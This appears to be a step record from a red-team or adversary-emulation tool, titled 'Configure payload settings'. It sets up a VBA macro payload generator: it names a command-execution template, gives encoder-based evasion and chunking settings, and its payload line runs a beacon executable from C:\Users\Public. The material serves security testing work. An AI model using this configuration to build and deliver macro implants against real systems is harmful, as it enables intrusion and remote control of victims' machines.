---
id: c2fb5ee2-a05b-454d-95a5-ff3ca96a894d
name: Configure payload settings
type: command
executor: bash
data: "{\n    \"description\": \"Generic command exec payload\\nEvasion technique\
  \ set to none\",\n    \"template\": \"templates/payloads/generic-cmd-template.vba\"\
  ,\n    \"varcount\": 152,\n    \"encodingoffset\": 5,\n    \"chunksize\": 180,\n\
  \    \"encodedvars\": \t{},\n    \"vars\": \t[],\n    \"evasion\": \t[\"encoder\"\
  ],\n    \"payload\": \"cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe\"\n}"
output: null
created_at: '2023-04-06T03:56:23.693567+00:00'
updated_at: '2023-04-10T20:36:49.692107+00:00'
---

# Configure payload settings

```bash
{
    "description": "Generic command exec payload\nEvasion technique set to none",
    "template": "templates/payloads/generic-cmd-template.vba",
    "varcount": 152,
    "encodingoffset": 5,
    "chunksize": 180,
    "encodedvars": 	{},
    "vars": 	[],
    "evasion": 	["encoder"],
    "payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
}
```


